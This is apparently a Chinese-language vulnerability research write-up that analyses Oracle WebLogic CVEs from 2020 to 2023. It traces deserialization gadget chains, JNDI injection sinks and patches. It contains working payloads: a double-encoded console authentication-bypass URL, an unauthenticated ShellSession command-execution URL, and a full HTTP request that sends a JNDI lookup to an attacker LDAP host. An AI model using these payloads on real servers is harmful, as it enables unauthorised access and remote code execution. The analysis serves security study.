在UniversalExtractor的writeExternal中（如下），可以看出反序列化可控的字段有三个m_sName、m_aoParam、m_nTarget：

![1686633884_6487fd9c88f1763a1ba9a.png!small?1686633884806](https://image.3001.net/images/20230613/1686633884_6487fd9c88f1763a1ba9a.png!small?1686633884806)

现在来看看UniversalExtractor的extract方法：

![1686633888_6487fda052a27586b2dd1.png!small?1686633888458](https://image.3001.net/images/20230613/1686633888_6487fda052a27586b2dd1.png!small?1686633888458)

m_cacheTarget在类实例化时默认为false，所以进入else，调用extractComplex方法：

![1686633892_6487fda4c39232416fae8.png!small?1686633892837](https://image.3001.net/images/20230613/1686633892_6487fda4c39232416fae8.png!small?1686633892837)

m_fMethod是个boolean类型，由于不可控在类实例化时默认为false，所以进入if循环，然后sCName是通过getCanonicalName方法得到，该方法体如下：

![1686633896_6487fda8c77d65e89103e.png!small?1686633896785](https://image.3001.net/images/20230613/1686633896_6487fda8c77d65e89103e.png!small?1686633896785)

通过getValueExtractorCanonicalName调用返回null，进入if语句，调用computeValueExtractorCanonicalName方法，传递属性m_sName和m_aoParam，computeValueExtractorCanonicalName方法体如下：

![1686633901_6487fdad0f89ecde43fff.png!small?1686633901321](https://image.3001.net/images/20230613/1686633901_6487fdad0f89ecde43fff.png!small?1686633901321)

首先是判断sName为方法名（方法名末尾带有括号），然后判断方法名是否以get或is开头，是的话就从方法名中获取字段名。举个例子：getDatabaseMetaData()会处理成databaseMetaData并返回。

接着在extractComplex方法中进入if语句：

![1686633905_6487fdb1bc2f10db7bed6.png!small?1686633905775](https://image.3001.net/images/20230613/1686633905_6487fdb1bc2f10db7bed6.png!small?1686633905775)

在if语句中，又将databaseMetaData首字母大写，即DatabaseMetaData，然后获取BEAN_ACCESSOR_PREFIXES属性的长度进行遍历，这里BEAN_ACCESSOR_PREFIXES属性的值为：

![1686633910_6487fdb62cbe7d8f67f1d.png!small?1686633910207](https://image.3001.net/images/20230613/1686633910_6487fdb62cbe7d8f67f1d.png!small?1686633910207)

其实就是个字符串数组，数组存着get和is字符串。

然后又将BEAN_ACCESSOR_PREFIXES的每一个元素与DatabaseMetaData字符串拼接，得到getDatabaseMetaData或isDatabaseMetaData字符串，然后将这两个拼接后的字符串作为实参，寻找这两个方法。最后成功找到了getDatabaseMetaData方法。

![1686633914_6487fdbae96202b338ff1.png!small?1686633915253](https://image.3001.net/images/20230613/1686633914_6487fdbae96202b338ff1.png!small?1686633915253)

然后反射调用该方法。后续就跳到getDatabaseMetaData中进行JNDI注入了。

## CVE-2020-14750

### 分析

该漏洞为Weblogic Console
后台登录绕过漏洞。正常需要认证才能访问/console/console.portal，而通过/console/images/%252e%252e/console.portal无需认证即可访问到/console/console.portal，首先因为二级路径/images不需要认证，然后后端对%252e%252e二次解码后为..，导致最后的URI为/console/images/../console.portal，再进行路径标准化，就变成/console/console.portal，最后再寻找处理该路径的Servlet，这样就造成未授权访问了。

![1686633920_6487fdc0b1a758e0cff4b.png!small?1686633920959](https://image.3001.net/images/20230613/1686633920_6487fdc0b1a758e0cff4b.png!small?1686633920959)

在getRequestPattern进行URL第一次解码，在getTree进行URL第二次解码。

### 修复

在MBeanUtilsInitSingleFileServlet类中，对URI进行黑名单过滤：

![1686633925_6487fdc5ec44ca1fa183c.png!small?1686633926041](https://image.3001.net/images/20230613/1686633925_6487fdc5ec44ca1fa183c.png!small?1686633926041)

当访问不需要认证的/images时，若检测到子路径包括`;`、`%252E%252E`、`..`、`%3C`、`%3E`、`<`、`>`就返回404。

## CVE-2020-14756

### 分析

利用链如下：

    
    
    AttributeHolder.readExternal()  
    ExternalizableHelper.readObject()  
    ExternalizableHelper.readObjectInternal()  
    ExternalizableHelper.readExternalizableLite()  
    PartialResult.readExternal()  
    PartialResult.add()  
    SortedBag.add()  
    TreeMap.put()  
    TreeMap.compare()  
    AbstractExtractor.compare()  
    MvelExtractor.extract()  
    MVEL.executeExpression()

反序列的类为AttributeHolder，它的readExternal如下：

![1686633935_6487fdcfec9de67222bff.png!small?1686633935908](https://image.3001.net/images/20230613/1686633935_6487fdcfec9de67222bff.png!small?1686633935908)

借助ExternalizableHelper进行反序列化，ExternalizableHelper没有黑名单过滤，所以可以在此处反序列化任何类。这里选择反序列化PartialResult类，然后来到PartialResult的readExternal方法：

![1686633940_6487fdd40ac2241baa594.png!small?1686633940145](https://image.3001.net/images/20230613/1686633940_6487fdd40ac2241baa594.png!small?1686633940145)

然后再次借助ExternalizableHelper进行反序列化，ExternalizableHelper没有黑名单过滤。反序列化的类应该是个Comparator接口的实现类。

在CVE-2020-2883中，使用AbstractExtractor的compare方法触发子类的extract方法。这次使用的子类为MvelExtractor，它的extract可以执行表达式。

在上图中，将readObject读取到的对象赋给m_comparator属性，但是并没有触发compare方法。所以接着往下看，读取一个int，然后调用instantiateInternalMap方法，传递m_comparator属性：

![1686633945_6487fdd91dcbaf063d55a.png!small?1686633945048](https://image.3001.net/images/20230613/1686633945_6487fdd91dcbaf063d55a.png!small?1686633945048)

![1686633948_6487fddc9c3a2b7772082.png!small?1686633948650](https://image.3001.net/images/20230613/1686633948_6487fddc9c3a2b7772082.png!small?1686633948650)

包装成TreeMap返回，赋值给m_map属性，接着调用readObject读取对象，然后调用add方法：

![1686633952_6487fde049f3a7c35a2e6.png!small?1686633952284](https://image.3001.net/images/20230613/1686633952_6487fde049f3a7c35a2e6.png!small?1686633952284)

接着进入super.add方法：

![1686633956_6487fde43b55ecbeef9a7.png!small?1686633956259](https://image.3001.net/images/20230613/1686633956_6487fde43b55ecbeef9a7.png!small?1686633956259)

在super.add方法中，调用getInternalMap方法获取刚刚包装的TreeMap，然后调用该TreeMap的put方法：

![1686633959_6487fde7e70c6aa60ac53.png!small?1686633959922](https://image.3001.net/images/20230613/1686633959_6487fde7e70c6aa60ac53.png!small?1686633959922)

put方法里，调用了compare方法：

![1686633963_6487fdebe2598e4fb365d.png!small?1686633963875](https://image.3001.net/images/20230613/1686633963_6487fdebe2598e4fb365d.png!small?1686633963875)

compare方法里，调用comparator属性的compare方法，然后来到AbstractExtractor的compare方法（如下，因为MvelExtractor未实现compare方法，所以交给父类AbstractExtractor处理）：

![1686633967_6487fdefc63c20a010621.png!small?1686633967779](https://image.3001.net/images/20230613/1686633967_6487fdefc63c20a010621.png!small?1686633967779)

中间省了一步无关紧要的，其实comparator属性的compare方法先来到WrapperComparator的compare再来到AbstractExtractor的compare方法的。这AbstractExtractor的compare方法中，调用了extract方法，来到子类MvelExtractor的extract方法：

![1686633971_6487fdf3ce356a3ea726f.png!small?1686633971888](https://image.3001.net/images/20230613/1686633971_6487fdf3ce356a3ea726f.png!small?1686633971888)

在extract方法中，先获取编译后的表达式然后执行。

### 修复

首先将MvelExtractor加入黑名单，然后在ExternalizableHelper.readExternalizableLite()中判断输入流是否为对象输入流实例，是的话则校验类是否在黑名单，在的话抛出异常。

![1686633979_6487fdfb0b8bd7b9549f1.png!small?1686633980057](https://image.3001.net/images/20230613/1686633979_6487fdfb0b8bd7b9549f1.png!small?1686633980057)

## CVE-2020-14825/CVE-2020-14841

### 分析

网上搜到的CVE-2020-14825和CVE-2020-14841都是一模一样的内容。

这个又与CVE-2020-14645相似，调用链如下：

    
    
    PriorityQueue.readObject()  
    PriorityQueue.heapify()  
    PriorityQueue.siftDown()  
    siftDownUsingComparator()  
    ExtractorComparator.compare()  
    LockVersionExtractor.extract()   
    MethodAttributeAccessor.getAttributeValueFromObject()  
    Method.invoke()  
    JdbcRowSetImpl.getDatabaseMetaData()

在CVE-2020-14645，是通过UniversalExtractor的extract方法触发后续JNDI注入的。

而在CVE-2020-14825/CVE-2020-14841，通过LockVersionExtractor的extract方法触发后续JNDI注入。

所以先来看看LockVersionExtractor的extract方法：

![1686633983_6487fdff256469ae20098.png!small?1686633983164](https://image.3001.net/images/20230613/1686633983_6487fdff256469ae20098.png!small?1686633983164)

![1686633987_6487fe03cb64d9e383543.png!small?1686633987787](https://image.3001.net/images/20230613/1686633987_6487fe03cb64d9e383543.png!small?1686633987787)

这个accessor为MethodAttributeAccessor类实例。调用MethodAttributeAccessor类实例的isInitialized方法判断setMethod属性和getMethod属性是否同时都有值。如果这个MethodAttributeAccessor类实例的setMethod和getMethod只要有一个为null，就是没被初始化，就会进入if语句，调用MethodAttributeAccessor类实例的initializeAttributes方法：

![1686633992_6487fe087adbb14f077e5.png!small?1686633992667](https://image.3001.net/images/20230613/1686633992_6487fe087adbb14f077e5.png!small?1686633992667)

![1686633996_6487fe0c7eacb6ce9cefa.png!small?1686633996423](https://image.3001.net/images/20230613/1686633996_6487fe0c7eacb6ce9cefa.png!small?1686633996423)

![1686634000_6487fe1067cf833c5a750.png!small?1686634000385](https://image.3001.net/images/20230613/1686634000_6487fe1067cf833c5a750.png!small?1686634000385)

在initializeAttributes方法中，通过getMethodName属性和setMethodName属性所指定的方法名去寻找方法，然后将方法Method设置到MethodAttributeAccessor类实例的getMethod属性和setMethod属性。

接下来进入getAttributeValueFromObject方法：

![1686634004_6487fe1432b4a893a0a59.png!small?1686634004181](https://image.3001.net/images/20230613/1686634004_6487fe1432b4a893a0a59.png!small?1686634004181)

![1686634009_6487fe199ccf839a14546.png!small?1686634009901](https://image.3001.net/images/20230613/1686634009_6487fe199ccf839a14546.png!small?1686634009901)

执行getter方法，执行的对象为anObject，anObject为JdbcRowSetImpl类实例。实参为parameters，parameters为null。

这就来到JdbcRowSetImpl.getDatabaseMetaData()，后续触发JNDI注入。

这里的写POC的思路是：

  1. 创建一个PriorityQueue对象，存储两个对象，一个为JdbcRowSetImpl对象，另一个为LockVersionExtractor对象；

  2. 将LockVersionExtractor对象的属性accessor设置为MethodAttributeAccessor对象；

  3. 将MethodAttributeAccessor的getMethodName属性设置成getDatabaseMetaData字符串；

我就懒得写了。

## CVE-2020-14882

### 分析

这与14750相似，14750使用/images绕过认证，访问console.portal，而14882使用/css绕过认证，访问console.portal，POC如下：

    
    
    /console/css/%252e%252e%252fconsole.portal

## CVE-2020-14883

### 分析

在Weblogic 12.2.1版本上有个ShellSession类，可以直接执行命令。

利用14882的未授权，指定handle为ShellSession，就可以直接未授权执行任意命令了。POC如下：

    
    
    /console/css/%252e%252e%252fconsole.portal?_nfpb=true&_pageLabel=&handle=com.tangosol.coherence.mvel2.sh.ShellSession("java.lang.Runtime.getRuntime().exec('touch%20/tmp/success1');")

ShellSession的构造函数中带有一个字符串参数，该参数为要执行的表达式，然后调用exec执行该表达式。

![1686634018_6487fe22c0fe741907975.png!small?1686634018798](https://image.3001.net/images/20230613/1686634018_6487fe22c0fe741907975.png!small?1686634018798)

在整个处理流程中，BreadcrumbBacking类的init方法会对URI中的handle参数进行处理：

![1686634022_6487fe26adcf16fc63076.png!small?1686634022991](https://image.3001.net/images/20230613/1686634022_6487fe26adcf16fc63076.png!small?1686634022991)

先调用findFirstHandle获取handle参数的值`com.tangosol.coherence.mvel2.sh.ShellSession("java.lang.Runtime.getRuntime().exec('touch%20/tmp/fuck');")`，然后调用getHandle方法：

![1686634028_6487fe2cc23ea7b96e7c3.png!small?1686634028967](https://image.3001.net/images/20230613/1686634028_6487fe2cc23ea7b96e7c3.png!small?1686634028967)

这里先将字符串`com.tangosol.coherence.mvel2.sh.ShellSession("java.lang.Runtime.getRuntime().exec('touch%20/tmp/fuck');")`分割成两部分，第一部分为`com.tangosol.coherence.mvel2.sh.ShellSession`，作为className；第二部分为`java.lang.Runtime.getRuntime().exec('touch%20/tmp/fuck');`，作为objectIdentifier。然后是注册ShellSession类，执行该类的构造函数，传递实参`java.lang.Runtime.getRuntime().exec('touch%20/tmp/fuck');`。

## CVE-2021-2109

### 分析

JNDI注入漏洞，使用IDEA发包，请求包如下：

    
    
    POST /console/css/%252e%252e%252f/consolejndi.portal HTTP/1.1  
    Host: 127.0.0.1:7001  
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36  
    Accept: image/avif,image/webp,image/apng,image/*,*/*;q=0.8  
    Referer: http://192.168.176.167:7001/console/css/%252e%252e%252f/consolejndi.portal  
    Accept-Encoding: gzip, deflate  
    Accept-Language: zh-CN,zh;q=0.9  
    Upgrade-Insecure-Requests: 1  
    Content-Type: application/x-www-form-urlencoded  
    Connection: close  
    Content-Length: 163  
    ​  
    _pageLabel=JNDIBindingPageGeneral&_nfpb=true&JNDIBindingPortlethandle=com.bea.console.handles.JndiBindingHandle(%22ldap://192.168.176;1:1389/ikun;AdminServer%22)

首先`_pageLabel`为JNDIBindingPageGeneral类型，定义该标签类型的xml文件如下：

![1686634040_6487fe387eed118f969d1.png!small?1686634040461](https://image.3001.net/images/20230613/1686634040_6487fe387eed118f969d1.png!small?1686634040461)

![1686634035_6487fe33e38c1fb4d7cef.png!small?1686634036004](https://image.3001.net/images/20230613/1686634035_6487fe33e38c1fb4d7cef.png!small?1686634036004)

JNDIBindingPageGeneral标签指向jndibinding.portlet文件。

查看jndibinding.portlet文件：

![1686634047_6487fe3f1975274f8fb58.png!small?1686634047102](https://image.3001.net/images/20230613/1686634047_6487fe3f1975274f8fb58.png!small?1686634047102)

发现它由JNDIBindingAction类进行处理。

然后在JNDIBindingAction的execute方法打断点：

![1686634052_6487fe440192fcce4136b.png!small?1686634052375](https://image.3001.net/images/20230613/1686634052_6487fe440192fcce4136b.png!small?1686634052375)

可以看到最后调用lookup发起JNDI查询，造成JNDI注入。

在中间，通过bindingHandle.getContext()获取context：

    
    
    String context = bindingHandle.getContext();

getContext方法体如下：

![1686634058_6487fe4abe0c2919f2e4e.png!small?1686634058692](https://image.3001.net/images/20230613/1686634058_6487fe4abe0c2919f2e4e.png!small?1686634058692)

然后进入getComponent方法查看：

![1686634062_6487fe4eaa04bf295c7fa.png!small?1686634062612](https://image.3001.net/images/20230613/1686634062_6487fe4eaa04bf295c7fa.png!small?1686634062612)

这里又调用了getComponents方法：

![1686634066_6487fe52521f774ae335e.png!small?1686634066377](https://image.3001.net/images/20230613/1686634066_6487fe52521f774ae335e.png!small?1686634066377)

先是通过getObjectIdentifier获取待处理字符串，然后创建字符串缓冲区currentComponent，最后进入for循环遍历字符串的每个字符。

![1686634070_6487fe56071f430f5c3b4.png!small?1686634070231](https://image.3001.net/images/20230613/1686634070_6487fe56071f430f5c3b4.png!small?1686634070231)

这个lastWasSpecial全程为false，所以从不会走if语句，第一个else
if判断是否为反斜杆，很明显待处理的字符串`ldap://192.168.176;1:1389/ikun;AdminServer`不包含反斜杠。

![1686634075_6487fe5bdafba1d0dd22d.png!small?1686634075908](https://image.3001.net/images/20230613/1686634075_6487fe5bdafba1d0dd22d.png!small?1686634075908)

然后进入第二个else
if判断是否为分号，若为分号则将currentComponent变成字符串加入componentList中，然后再将currentComponent置空。

最后else，则判断currentComponent是否为null，若为null则抛出异常，不为null，则将遍历的字符加入字符串缓冲区currentComponent中。

所以待处理的字符串`ldap://192.168.176;1:1389/ikun;AdminServer`，会这样处理：

  1. 未遇到分号前，`ldap://192.168.176`依次存入currentComponent。

  2. 遇到第一个分号，currentComponent化成字符串存入componentList，然后字符串缓冲区currentComponent清空。这时componentList第一个元素为字符串`ldap://192.168.176`。

  3. 然后接着将`1:1389/ikun`中每个字符依次存入currentComponent。

  4. 遇到第二个分号，currentComponent化成字符串存入componentList，然后字符串缓冲区currentComponent清空。这时componentList第二个元素为字符串`1:1389/ikun`。

  5. 最后依次将`AdminServer`存入currentComponent，然后结束循环。

  6. 结束循环之后，将currentComponent转成字符串然后存入componentList，这时componentList第三个元素为`AdminServer`。然后将componentList转成字符串数组并赋给components属性。

![1686634085_6487fe6514cff1fc294e4.png!small?1686634085233](https://image.3001.net/images/20230613/1686634085_6487fe6514cff1fc294e4.png!small?1686634085233)

方法结束，返回components属性。

回到execute方法中：

![1686634089_6487fe69958d87261875a.png!small?1686634089737](https://image.3001.net/images/20230613/1686634089_6487fe69958d87261875a.png!small?1686634089737)

    
    
    String context = bindingHandle.getContext();  
    String bindName = bindingHandle.getBinding();  
    String serverName = bindingHandle.getServer();

getContext()、getBinding()、getServer()分别返回components属性的前三个元素。即`ldap://192.168.176`、`1:1389/ikun`、`AdminServer`。

在execute方法体后面：

![1686634096_6487fe70bcfd52a099a3e.png!small?1686634097031](https://image.3001.net/images/20230613/1686634096_6487fe70bcfd52a099a3e.png!small?1686634097031)

获取InitialContext，prefix设置为context（`ldap://192.168.176`）、suffix设置为bindName（`1:1389/ikun`），在prefix字符串末尾追加一个点号，然后将prefix和suffix拼接，作为lookup参数，发起JNDI查询。

## CVE-2021-2135

### 分析

利用链如下：

    
    
    AttributeHolder.readExternal()  
    ExternalizableHelper.readObject()  
    ExternalizableHelper.readObjectInternal()  
    ExternalizableHelper.readExternalizableLite()  
    ConditionalPutAll.readExternal()  
    ExternalizableHelper.readMap()  
    InflatableMap.put()  
    Objects.equals()  
    XString.equals()  
    SimpleBinaryEntry.toString()  
    SimpleBinaryEntry.getKey()  
    ExternalizableHelper.fromBinary()  
    ExternalizableHelper.deserializeInternal()  
    ExternalizableHelper.readObjectInternal()  
    ExternalizableHelper.readExternalizableLite()  
    PartialResult.readExternal()  
    PartialResult.add()  
    SortedBag.add()  
    TreeMap.put()  
    TreeMap.compare()  
    AbstractExtractor.compare()  
    MvelExtractor.extract()  
    MVEL.executeExpression()

利用CVE-2020-14756的AttributeHolder作为入口点，中间衔接了新的类ConditionalPutAll，接着使用了SimpleBinaryEntry，触发fromBinary，在deserializeInternal类新建输入流绕过黑名单限制，成功进到MvelExtractor.extract()进而表达式执行。

这里直接从ConditionalPutAll的readExternal方法开始：

![1686634109_6487fe7d48d19de3a7927.png!small?1686634109268](https://image.3001.net/images/20230613/1686634109_6487fe7d48d19de3a7927.png!small?1686634109268)

新建LiteMap实例，然后赋给m_map属性以及临时变量map，然后调用readMap方法。

![1686634113_6487fe81a283b8da4b264.png!small?1686634113662](https://image.3001.net/images/20230613/1686634113_6487fe81a283b8da4b264.png!small?1686634113662)

LiteMap没有put方法，所以由它的父类InflatableMap执行put方法：

![1686634117_6487fe859f2323eba7379.png!small?1686634117623](https://image.3001.net/images/20230613/1686634117_6487fe859f2323eba7379.png!small?1686634117623)

![1686634122_6487fe8a0e59fd6052c6a.png!small?1686634121993](https://image.3001.net/images/20230613/1686634122_6487fe8a0e59fd6052c6a.png!small?1686634121993)

来到XString的equals方法：

![1686634126_6487fe8eab93a1e5c8db7.png!small?1686634126674](https://image.3001.net/images/20230613/1686634126_6487fe8eab93a1e5c8db7.png!small?1686634126674)

接着来到SimpleBinaryEntry的toString方法：

![1686634130_6487fe929518abe7f9ad9.png!small?1686634130716](https://image.3001.net/images/20230613/1686634130_6487fe929518abe7f9ad9.png!small?1686634130716)

![1686634134_6487fe9635bc392e8465c.png!small?1686634134187](https://image.3001.net/images/20230613/1686634134_6487fe9635bc392e8465c.png!small?1686634134187)

这里m_key属性必为null，因为它是transient修饰的。m_binKey不为transient且在readExternal时已经赋上了值。

![1686634138_6487fe9a6ae097ec619af.png!small?1686634138624](https://image.3001.net/images/20230613/1686634138_6487fe9a6ae097ec619af.png!small?1686634138624)

![1686634142_6487fe9e43d9d3322026b.png!small?1686634142482](https://image.3001.net/images/20230613/1686634142_6487fe9e43d9d3322026b.png!small?1686634142482)

在deserializeInternal中有个重点，他从缓冲区中获取流，该输入流是没有黑名单拦截的。nType不为21，所以调用readObjectInternal方法：

![1686634146_6487fea2b54924e1c3afd.png!small?1686634146778](https://image.3001.net/images/20230613/1686634146_6487fea2b54924e1c3afd.png!small?1686634146778)

![1686634151_6487fea7e55a11f561f54.png!small?1686634152019](https://image.3001.net/images/20230613/1686634151_6487fea7e55a11f561f54.png!small?1686634152019)

后续是CVE-2020-14756的利用链后半部分，最终执行表达式。

### 重大修复

在InboundMsgAbbrev新增了一个白名单字段：

    
    
    private static final Class[] ABBREV_CLASSES = new Class[]{  
    String.class,   
    ServiceContext.class,   
    ClassTableEntry.class,   
    JVMID.class,   
    AuthenticatedUser.class,   
    RuntimeMethodDescriptor.class,   
    Immutable.class  
    };

同时在该类的readObject方法里将白名单字段ABBREV_CLASSES传入readObjectValidated方法：

![1686634158_6487feae47dd535ff8b7d.png!small?1686634158353](https://image.3001.net/images/20230613/1686634158_6487feae47dd535ff8b7d.png!small?1686634158353)

readObjectValidated方法体如下：

![1686634162_6487feb244b5c8cac24e9.png!small?1686634162220](https://image.3001.net/images/20230613/1686634162_6487feb244b5c8cac24e9.png!small?1686634162220)

接着将白名单传递给FilteringObjectInputStream的expectedTypes属性，然后调用readObject方法反序列化。

在反序列化时，会调用ServerChannelInputStream的resolveClass来链接类（如下）：

![1686634166_6487feb66a628f9a181d5.png!small?1686634166522](https://image.3001.net/images/20230613/1686634166_6487feb66a628f9a181d5.png!small?1686634166522)

这里先调用checkLegacyBlacklistIfNeeded检测类名是否在黑名单，然后调用父类的resolveClass方法：

![1686634170_6487feba650fefd2b1b22.png!small?1686634170367](https://image.3001.net/images/20230613/1686634170_6487feba650fefd2b1b22.png!small?1686634170367)

父类FilteringObjectInputStream再调用父类的resolveClass链接类，找到类之后，调用validateReturnType方法（如下）：

![1686634174_6487febe78661e3fd00c7.png!small?1686634174531](https://image.3001.net/images/20230613/1686634174_6487febe78661e3fd00c7.png!small?1686634174531)

判断反序列化的类是否为白名单中的类的子类，如果是，则放行。

## CVE-2021-2294

### 分析

漏洞的影响仅限于往可控地址发送JDBC请求。

在OraclePooledConnection的readObject方法：

![1686634180_6487fec4bc778cf981dd3.png!small?1686634180777](https://image.3001.net/images/20230613/1686634180_6487fec4bc778cf981dd3.png!small?1686634180777)

后续就是发起JDBC请求的细节了，与常规JDBC反序列化漏洞相比，WebLogic中发起JDBC请求之后并没有反序列化的步骤。

## CVE-2021-2394

### 分析

通过JNDI注入进行RCE，利用链如下：

    
    
    AttributeHolder.readExternal()  
    ExternalizableHelper.readObject()  
    ExternalizableHelper.readObjectInternal()  
    ExternalizableHelper.readExternalizableLite()  
    PartialResult.readExternal()  
    ExternalizableHelper.readObject()   
    FilterExtractor.readExternal()  
    FilterExtractor.readAttributeAccessor()  
    PartialResult.add()  
    SortedBag.add()  
    TreeMap.put()  
    WrapperComparator.compare()  
    AbstractExtractor.compare()  
    FilterExtractor.compare()  
    FilterExtractor.extract()  
    MethodAttributeAccessor.getAttributeValueFromObject()  
    Method.invoke()  
    JdbcRowSetImpl.getDatabaseMetaData()

前半部分由CVE-2020-14756组成，从PartialResult.readExternal()方法开始：

![1686634189_6487fecdcd95dd73d70d6.png!small?1686634190186](https://image.3001.net/images/20230613/1686634189_6487fecdcd95dd73d70d6.png!small?1686634190186)

这里先反序列化FilterExtractor，会来到该类的readExternal进行反序列化：

![1686634194_6487fed2bb539c6371ff5.png!small?1686634194955](https://image.3001.net/images/20230613/1686634194_6487fed2bb539c6371ff5.png!small?1686634194955)

调用SerializationHelper.readAttributeAccessor(in);然后将返回值，赋给attributeAccessor属性。点进去查看该方法：

![1686634198_6487fed68f91b8a03b545.png!small?1686634198600](https://image.3001.net/images/20230613/1686634198_6487fed68f91b8a03b545.png!small?1686634198600)

新建MethodAttributeAccessor，设置属性名、getter方法名、setter方法名，然后将其返回。

回到PartialResult.readExternal()方法，第二次反序列化JdbcRowSetImpl，然后调用add方法：

![1686634204_6487fedcb3c57402a2f3d.png!small?1686634204741](https://image.3001.net/images/20230613/1686634204_6487fedcb3c57402a2f3d.png!small?1686634204741)

![1686634208_6487fee0b6ed6fb387422.png!small?1686634208752](https://image.3001.net/images/20230613/1686634208_6487fee0b6ed6fb387422.png!small?1686634208752)

接着调用put方法将JdbcRowSetImpl实例作为第一个参数：

![1686634213_6487fee55955fe390afe7.png!small?1686634213332](https://image.3001.net/images/20230613/1686634213_6487fee55955fe390afe7.png!small?1686634213332)

省略WrapperComparator.compare()，来到AbstractExtractor.compare()：

![1686634220_6487feec3662626e7c902.png!small?1686634220189](https://image.3001.net/images/20230613/1686634220_6487feec3662626e7c902.png!small?1686634220189)

这里调用子类FilterExtractor的extract方法：

![1686634224_6487fef0b1307f8c26c1d.png!small?1686634224743](https://image.3001.net/images/20230613/1686634224_6487fef0b1307f8c26c1d.png!small?1686634224743)

![1686634229_6487fef54551bd780556d.png!small?1686634229571](https://image.3001.net/images/20230613/1686634229_6487fef54551bd780556d.png!small?1686634229571)

反射调用JdbcRowSetImpl的getDatabaseMetaData方法，后面就是经典JNDI注入了。

## CVE-2022-21350

### 分析

这是一条全新的利用链，通过JNDI进行RCE。

这里官网写的是T3的反序列化漏洞，但是在2021年4月的补丁已经为T3设置了白名单，而该漏洞是晚于4月的，所以T3是打不了的，官网也不知道为啥写了T3，而且很多人的分析文章也没有提及白名单这回事，估计根本没复现或者说根本就没打补丁所以不知道这回事。

利用链如下：

    
    
    BadAttributeValueExpException.readObject()  
    SessionData.toString()  
    SessionData.isDebuggingSession()  
    SessionData.getAttribute()  
    SessionData.getAttributeInternal()  
    AttributeWrapperUtils.unwrapObject()  
    AttributeWrapperUtils.unwrapEJBObjects()  
    BusinessHandleImpl.getBusinessObject()  
    HomeHandleImpl.getEJBHome()  
    Context.lookup()

从BadAttributeValueExpException.readObject()进行查看：

![1686634237_6487fefd4b23679515201.png!small?1686634237474](https://image.3001.net/images/20230613/1686634237_6487fefd4b23679515201.png!small?1686634237474)

由这里进入SessionData的toString方法。

![1686634242_6487ff020b5c4d2be3375.png!small?1686634242084](https://image.3001.net/images/20230613/1686634242_6487ff020b5c4d2be3375.png!small?1686634242084)

进入isDebuggingSession方法。

![1686634247_6487ff0700f398073020d.png!small?1686634246970](https://image.3001.net/images/20230613/1686634247_6487ff0700f398073020d.png!small?1686634246970)

调用getAttribute方法，传递字符串`wl_debug_session`。

![1686634252_6487ff0c064258eab2f7a.png!small?1686634252034](https://image.3001.net/images/20230613/1686634252_6487ff0c064258eab2f7a.png!small?1686634252034)

getSecurityModuleAttribute方法返回null，接着进入getAttributeInternal方法。

![1686634257_6487ff112edf91400af12.png!small?1686634257285](https://image.3001.net/images/20230613/1686634257_6487ff112edf91400af12.png!small?1686634257285)

attributes属性为map，这里从map中取字符串`wl_debug_session`对应的Object，将Object强转为AttributeWrapper类型，然后将其作为调用unwrapObject方法的第二个参数。

![1686634262_6487ff160bd01e00e9aac.png!small?1686634262042](https://image.3001.net/images/20230613/1686634262_6487ff160bd01e00e9aac.png!small?1686634262042)

unwrapObject方法里，先通过getObject取Object，然后判断该Object是否为EJB包装对象，是的话调用unwrapEJBObjects方法。

![1686634266_6487ff1a43a29b6266e52.png!small?1686634266433](https://image.3001.net/images/20230613/1686634266_6487ff1a43a29b6266e52.png!small?1686634266433)

接着进入getBusinessObject方法。

![1686634271_6487ff1feb483e3c1e29f.png!small?1686634272002](https://image.3001.net/images/20230613/1686634271_6487ff1feb483e3c1e29f.png!small?1686634272002)

两个属性businessObject和primaryKey都为null，进入getEJBHome方法。

![1686634276_6487ff24cd4e2724901bc.png!small?1686634276904](https://image.3001.net/images/20230613/1686634276_6487ff24cd4e2724901bc.png!small?1686634276904)

在getEJBHome方法中，通过可控的注册中心地址this.serverURL获取上下文，然后又通过该上下文将可控的查询名this.jndiName作为参数进行JNDI查询，造成JNDI注入。

## CVE-2023-21839

### 分析

该漏洞的原理为：

  1. 客户端先使用rebind操作，去绑定一个对象到服务端中；

  2. 然后客户端使用lookup操作，请求服务端，查找刚刚绑定的对象；

  3. 服务端接受到lookup请求，在查找该名称对应的对象时，会判断该对象是否为OpaqueReference接口的实例，若是，则调用该对象的getReferent方法。

接着看一下lookup请求对应的利用链：

    
    
    getReferent:74, ForeignOpaqueReference (weblogic.jndi.internal) <------  
    getObjectInstance:106, WLNamingManager (weblogic.jndi.internal) <------  
    resolveObject:1037, BasicNamingNode (weblogic.jndi.internal)  
    resolveObject:1009, BasicNamingNode (weblogic.jndi.internal)    
    lookupSharable:1578, BasicNamingNode (weblogic.jndi.internal) <------  
    lookupSharable:47, PartitionHandler (weblogic.jndi.internal)  
    lookup:536, ServerNamingNode (weblogic.jndi.internal)  
    lookup:84, RootNamingNode (weblogic.jndi.internal)  
    lookup:307, WLEventContextImpl (weblogic.jndi.internal)  
    lookup:435, WLContextImpl (weblogic.jndi.internal)  
    lookup:417, InitialContext (javax.naming)  
    resolveObject:461, NamingContextImpl (weblogic.corba.cos.naming)  
    resolve_any:368, NamingContextImpl (weblogic.corba.cos.naming)  
    _invoke:114, _NamingContextAnyImplBase (weblogic.corba.cos.naming) <------  
    invoke:249, CorbaServerRef (weblogic.corba.idl)  
    invoke:246, ClusterableServerRef (weblogic.rmi.cluster)  
    run:534, BasicServerRef$2 (weblogic.rmi.internal)  
    doAs:386, AuthenticatedSubject (weblogic.security.acl.internal)  
    runAs:163, SecurityManager (weblogic.security.service)  
    handleRequest:531, BasicServerRef (weblogic.rmi.internal)  
    run:138, WLSExecuteRequest (weblogic.rmi.internal.wls)  
    _runAs:352, ComponentInvocationContextManager (weblogic.invocation)  
    runAs:337, ComponentInvocationContextManager (weblogic.invocation)  
    doRunWorkUnderContext:57, LivePartitionUtility (weblogic.work)  
    runWorkUnderContext:41, PartitionUtility (weblogic.work)  
    runWorkUnderContext:655, SelfTuningWorkManagerImpl (weblogic.work)  
    execute:420, ExecuteThread (weblogic.work)  
    run:360, ExecuteThread (weblogic.work)

这里只看标了<\------的地方，首先是NamingContextAnyImplBase._invoke：

![1686634284_6487ff2cc91c033ac3697.png!small?1686634284844](https://image.3001.net/images/20230613/1686634284_6487ff2cc91c033ac3697.png!small?1686634284844)

方法体根据不同类型进行不同操作，lookup请求对应的类型为2，进行的操作为resolve_any。

然后来到BasicNamingNode的lookupSharable方法：

